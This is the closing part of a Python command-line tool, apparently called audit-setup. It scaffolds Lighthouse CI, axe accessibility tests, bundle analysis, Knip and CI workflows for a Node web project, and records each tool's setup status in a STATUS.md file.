                k for k in ("lhci", "lh:bless") if k in scripts and k not in stripped
            ]
            for k in kept_scripts:
                print(
                    f"kept package.json script '{k}' (hand-edited: value does not match)"
                )
        if kept:
            print(
                f"lighthouse-ci: uninstalled, {len(kept)} hand-edited file(s) kept. Baseline and @lhci/cli left in place."
            )
        else:
            print("lighthouse-ci: uninstalled. Baseline and @lhci/cli left in place.")
        return
    require_node_project(root)
    if baseline_count(root) == 0:
        raise SetupError(
            "no Lighthouse baseline at ops/lighthouse/baseline/. Run /audit-setup --lighthouse-only first."
        )
    rerun = root / "ops/lighthouse/run-baseline.sh"
    if rerun.exists() and "LH_TARGET_URL" not in rerun.read_text():
        print(
            "warning: ops/lighthouse/run-baseline.sh is a legacy hand-written version; lh:bless will not work until"
        )
        print(
            "         you recapture with /audit-setup --lighthouse-only --force. CI itself still works."
        )
    rc = root / ".lighthouserc.json"
    if enforce:
        if not rc.exists():
            raise SetupError("no .lighthouserc.json to enforce")
        if dry_run:
            print(
                "--dry-run: would flip every warn-level assertion to error in .lighthouserc.json"
            )
            return
        lh_baseline.enforce(rc)
        return
    config = (
        json.dumps(
            lh_baseline.assertions(
                root / "ops/lighthouse/baseline",
                json.loads(rc.read_text()) if has_sentinel(rc, LHCI_SENTINEL) else None,
            ),
            indent=2,
        )
        + "\n"
    )
    if regen_only:
        if rc.exists() and not has_sentinel(rc, LHCI_SENTINEL) and not force:
            raise SetupError(
                "refusing to replace unowned .lighthouserc.json; use --force"
            )
        if dry_run:
            print(config[:1500])
            return
        rc.write_text(config)
        print("lighthouse-ci: regenerated .lighthouserc.json")
        return
    patterns = lh_baseline.normalize_hosts(allow_hosts or ["*.vercel.app"])
    allowlist = json.dumps(patterns)
    helper = root / "ops/lighthouse/lh_baseline.py"
    current_helper = (HERE / "lh_baseline.py").read_bytes()
    if helper.exists() and helper.read_bytes() != current_helper and not force:
        if "Lighthouse baseline helper." not in helper.read_text(errors="replace"):
            raise SetupError("unowned ops/lighthouse/lh_baseline.py; use --force")
        raise SetupError("stale ops/lighthouse/lh_baseline.py; use --force to refresh")
    write_files = {
        f: clobber_guard(root, f, sentinel, force, "lighthouse-ci")
        for f, sentinel in owned
    }
    if dry_run:
        print(
            f"lighthouse-ci --dry-run: package manager {detect_pm(root)}, URL allowlist {allowlist}"
        )
        print(
            "Would write .github/workflows/lighthouse-ci.yml, .github/ci/lh-bless.sh, .github/ci/README.md, .lighthouserc.json"
        )
        print("Would install @lhci/cli and add scripts lhci, lh:bless")
        print(config[:1500])
        return
    ensure_dev(root, "@lhci/cli")
    (root / ".github/ci").mkdir(parents=True, exist_ok=True)
    wf.parent.mkdir(parents=True, exist_ok=True)
    bodies = {
        wf: (REFS / "lighthouse-ci.yml.tmpl")
        .read_text()
        .replace("{{DOMAIN_ALLOWLIST}}", allowlist),
        rc: config,
        root / ".github/ci/lh-bless.sh": (REFS / "lh-bless.sh.tmpl").read_text(),
        root / ".github/ci/README.md": (REFS / "ci-readme.md.tmpl")
        .read_text()
        .replace("{{PM_RUN_LH_BLESS}}", pm_run(root, "lh:bless")),
    }
    for path, body in bodies.items():
        if write_files[path]:
            path.write_text(body)
            if path.name == "lh-bless.sh":
                path.chmod(0o755)
    helper.parent.mkdir(parents=True, exist_ok=True)
    if not helper.exists() or force:
        backup_lighthouse_files(helper.parent, (helper.name,))
        shutil.copyfile(HERE / "lh_baseline.py", helper)
    add_script(root, "lhci", "lhci autorun")
    add_script(root, "lh:bless", "sh .github/ci/lh-bless.sh")
    print(
        "lighthouse-ci: scaffolded. Commit and push; it fires on the next successful preview deploy."
    )
    print(
        f"  Enforce later: /audit-setup --ci-only --enforce. Test locally: {pm_run(root, 'lhci')}"
    )


# --------------------------------------------------------------------------- orchestration


def missing(root: Path, tool: str) -> bool:
    if tool == "lighthouse":
        helper = root / "ops/lighthouse/lh_baseline.py"
        return (
            not lh_baseline.published_baseline_valid(root / "ops/lighthouse/baseline")
            or not helper.is_file()
            or helper.read_bytes() != (HERE / "lh_baseline.py").read_bytes()
        )
    if tool == "axe":
        return not has_dep(root, "@axe-core/playwright") or not axe_spec_present(root)
    if tool == "bundle":
        return not any(
            has_dep(root, d)
            for d in ("@next/bundle-analyzer", "rollup-plugin-visualizer", "size-limit")
        )
    if tool == "knip":
        return (
            not has_dep(root, "knip")
            or not any((root / n).exists() for n in ("knip.json", "knip.ts"))
            or "dead-code" not in (read_pkg(root).get("scripts") or {})
        )
    if tool == "quality-ci":
        return not all(
            has_sentinel(root / ".github/workflows" / n, QCI_SENTINEL)
            for n in ("ci.yml", "dependabot-auto-merge.yml")
        )
    if tool == "ci":
        return (
            not has_dep(root, "@lhci/cli")
            or not all(
                has_sentinel(root / n, sentinel)
                for n, sentinel in (
                    (".github/workflows/lighthouse-ci.yml", LHCI_SENTINEL),
                    (".github/ci/lh-bless.sh", LH_BLESS_SENTINEL),
                    (".github/ci/README.md", LHCI_SENTINEL),
                    (".lighthouserc.json", LHCI_SENTINEL),
                )
            )
            or not (root / "ops/lighthouse/lh_baseline.py").is_file()
            or not all(
                k in (read_pkg(root).get("scripts") or {}) for k in ("lhci", "lh:bless")
            )
        )
    raise ValueError(tool)


def canary(root: Path, tool: str) -> str:
    """For a tool this run claims to have set up, confirm its artifact is on disk. Catches a
    step that returned success without producing output (install worked, config write failed)."""
    ok = {
        "lighthouse": lambda: not missing(root, "lighthouse"),
        "axe": lambda: axe_spec_present(root),
        "bundle": lambda: not missing(root, "bundle"),
        "knip": lambda: (root / "knip.json").exists() or (root / "knip.ts").exists(),
        "quality-ci": lambda: has_sentinel(
            root / ".github/workflows/ci.yml", QCI_SENTINEL
        ),
        "ci": lambda: has_sentinel(
            root / ".github/workflows/lighthouse-ci.yml", LHCI_SENTINEL
        ),
    }[tool]()
    artifact = {
        "lighthouse": "ops/lighthouse/baseline/*.report.json",
        "axe": f"{playwright_test_dir(root)}/a11y/*.spec.*",
        "bundle": "analyzer devDependency in package.json",
        "knip": "knip.json",
        "quality-ci": ".github/workflows/ci.yml with sentinel",
        "ci": ".github/workflows/lighthouse-ci.yml with sentinel",
    }[tool]
    return "" if ok else f"{tool}: expected {artifact}"


def write_status(root: Path, ran: list, skipped: list, failed: list) -> Path:
    stamp = datetime.datetime.now().astimezone().strftime("%Y-%m-%d %H:%M %Z")

    def bullets(items, word):
        return "\n".join(f"- {word}: {t}" for t in items) or "- none"

    text = f"""# Audit Tooling Status - {stamp}

Generated by `/audit-setup`. Run `/audit-setup --status` any time to re-check.

## Ran this invocation
{bullets(ran, "ran")}

## Skipped (already set up or not applicable)
{bullets(skipped, "skipped")}

## Failed
{bullets(failed, "FAILED")}

Package manager: **{detect_pm(root)}**

## What /review-stack --audit now consumes

| Tool | Artifact | Rerun |
|---|---|---|
| Lighthouse | `ops/lighthouse/baseline/*.report.json` + `SUMMARY.md` | `sh ops/lighthouse/run-baseline.sh` |
| axe | `{playwright_test_dir(root)}/a11y/smoke.spec.ts` | `npx playwright test --grep @a11y` |
| Bundle analyzer | `ops/audit/bundle-analyzer-snippet.md` or `.size-limit.json` | `{pm_run(root, "analyze")}` (Next.js) |
| Knip | `knip.json` | `npx knip` |
| Quality gate | `.github/workflows/ci.yml` | runs on every PR and push to the default branch |
| Lighthouse CI | `.github/workflows/lighthouse-ci.yml` | runs on every successful preview deploy |
"""
    path = root / "ops/audit/STATUS.md"
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(text)
    return path


def run_all(
    root: Path,
    only: str = "",
    force: bool = False,
    dry_run: bool = False,
    target_url: str = "",
    routes: str = "",
    runs: int = 3,
) -> int:
    if only == "quality-ci":
        quality_ci(root, force=force, dry_run=dry_run)
        return 0
    if only in ("", "lighthouse", "ci"):
        try:
            require_unlocked_lighthouse(root)
        except SetupError as exc:
            print(f"!!! {exc}")
            return 1
    s = status(root)
    print_status(s)
    print()
    if not s["package_json"]:
        print(
            "Not a Node project: no package.json. Run from a package root or pass --project-dir."
        )
        return 2
    # --all covers the four local tools. The two CI scaffolds are opt-in (--ci, --ci-only).
    tools = [only] if only else ["lighthouse", "axe", "bundle", "knip"]
    ran, skipped, failed = [], [], []
    plan = []
    for tool in tools:
        if tool == "bundle" and s["framework"] == "unknown":
            skipped.append("bundle (no framework detected)")
        elif missing(root, tool) or force:
            plan.append(tool)
        else:
            skipped.append(f"{tool} (already set up)")
    if dry_run:
        print("--dry-run: would set up: " + (", ".join(plan) or "nothing"))
        for item in skipped:
            print(f"  skip {item}")
        return 0
    actions = {
        "lighthouse": lambda: setup_lighthouse(root, target_url, routes, runs, force),
        "axe": lambda: setup_axe(root, routes, force),
        "bundle": lambda: setup_bundle(root, force),
        "knip": lambda: setup_knip(root, force),
        "quality-ci": lambda: quality_ci(root, force=force),
        "ci": lambda: lighthouse_ci(root, force=force),
    }
    for tool in plan:
        print(f"\n=== Setting up {tool} ===")
        try:
            actions[tool]()
            ran.append(tool)
        except (SetupError, OSError) as exc:
            # OSError (disk full, permission denied, ENOSPC mid-write) is caught here
            # too: one tool hitting the filesystem should end up in STATUS.md as a
            # clean "FAILED: tool (reason)" line, not a raw traceback that kills every
            # tool still queued behind it.
            print(f"!!! {tool} setup failed: {exc}")
            failed.append(f"{tool} ({exc})")
    if not ran and not failed:
        print(
            "\naudit-setup: nothing to do. Every requested tool is already set up. Run /audit-setup --status for details."
        )
        return 0
    for tool in ran:
        problem = canary(root, tool)
        if problem:
            failed.append(f"canary {problem}")
    path = write_status(root, ran, skipped, failed)
    print("\n=== Done ===")
    print(f"Ran:     {', '.join(ran) or 'none'}")
    print(f"Skipped: {', '.join(skipped) or 'none'}")
    if failed:
        print(f"Failed:  {'; '.join(failed)}")
    print(f"Status:  {path.relative_to(root)}")
    return 1 if failed else 0


def main(argv=None) -> int:
    ap = argparse.ArgumentParser(
        description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter
    )
    # SUPPRESS, not a real default: a subparser always re-parses into the same
    # namespace and copies every key it sees back over what the top-level
    # parser already set, so a subparser copy of this with a real default
    # would stomp a --project-dir given before the subcommand. getattr()
    # below supplies the actual default once, after parsing.
    ap.add_argument("--project-dir", default=argparse.SUPPRESS, type=Path)
    sub = ap.add_subparsers(dest="cmd", required=True)
    st = sub.add_parser("status")
    st.add_argument("--json", action="store_true")
    sub.add_parser("routes")
    r = sub.add_parser("run")
    r.add_argument("--only", choices=TOOLS)
    for p in (r, sub.add_parser("lighthouse")):
        p.add_argument("--target-url", default="")
        p.add_argument("--routes", default="")
        p.add_argument("--runs", type=int, default=3)
    ax = sub.add_parser("axe")
    ax.add_argument("--routes", default="")
    sub.add_parser("bundle")
    sub.add_parser("knip")
    q = sub.add_parser("quality-ci")
    q.add_argument("--workdir", default="")
    q.add_argument("--node", default="")
    q.add_argument("--default-branch", default="")
    q.add_argument("--uninstall", action="store_true")
    lc = sub.add_parser("lighthouse-ci")
    lc.add_argument("--regen-assertions-only", action="store_true")
    lc.add_argument("--enforce", action="store_true")
    lc.add_argument("--uninstall", action="store_true")
    lc.add_argument(
        "--allow-host",
        action="append",
        default=[],
        help="hostname or *.domain boundary the workflow may audit (repeatable)",
    )
    for p in sub.choices.values():
        p.add_argument("--force", action="store_true")
        p.add_argument("--dry-run", action="store_true")
        # --project-dir must work after the subcommand too (SKILL.md's own
        # examples show it there); SUPPRESS for the same reason as above.
        p.add_argument("--project-dir", default=argparse.SUPPRESS, type=Path)
    a = ap.parse_args(argv)
    root = getattr(a, "project_dir", Path(".")).resolve()
    # Every subcommand below is inside this one try/except: `status`, `routes` and
    # `run` used to bypass it, so a malformed package.json (read_pkg now raises,
    # named) or a raw OSError from any of them fell through as an unhandled traceback
    # instead of the same clean "audit-setup: <reason>" every other command gives.
    try:
        if a.cmd == "status":
            if not (root / "package.json").exists():
                print(
                    "audit-setup: not a Node project: no package.json. Run from a package root or pass --project-dir.",
                    file=sys.stderr,
                )
                return 2
            s = status(root)
            print(json.dumps(s, indent=2)) if a.json else print_status(s)
            return 0
        if a.cmd == "routes":
            print(" ".join(detect_routes(root)))
            return 0
        if a.cmd == "run":
            return run_all(
                root, a.only or "", a.force, a.dry_run, a.target_url, a.routes, a.runs
            )
        if a.dry_run and a.cmd in ("lighthouse", "axe", "bundle", "knip"):
            print(
                f"--dry-run: would set up {a.cmd}"
                + (
                    ""
                    if missing(root, a.cmd) or a.force
                    else " (already set up; nothing would change)"
                )
            )
        elif a.cmd == "lighthouse":
            setup_lighthouse(root, a.target_url, a.routes, a.runs, a.force)
        elif a.cmd == "axe":
            setup_axe(root, a.routes, a.force)
        elif a.cmd == "bundle":
            setup_bundle(root, a.force)
        elif a.cmd == "knip":
            setup_knip(root, a.force)
        elif a.cmd == "quality-ci":
            quality_ci(
                root,
                a.workdir,
                a.node,
                a.default_branch,
                a.force,
                a.dry_run,
                a.uninstall,
            )
        elif a.cmd == "lighthouse-ci":
            lighthouse_ci(
                root,
                a.force,
                a.dry_run,
                a.regen_assertions_only,
                a.enforce,
                a.uninstall,
                a.allow_host,
            )
    except SetupError as exc:
        print(f"audit-setup: {exc}", file=sys.stderr)
        return 1
    except (OSError, ValueError) as exc:
        print(f"audit-setup: cannot run here: {exc}", file=sys.stderr)
        return 2
    return 0


if __name__ == "__main__":
    sys.exit(main())
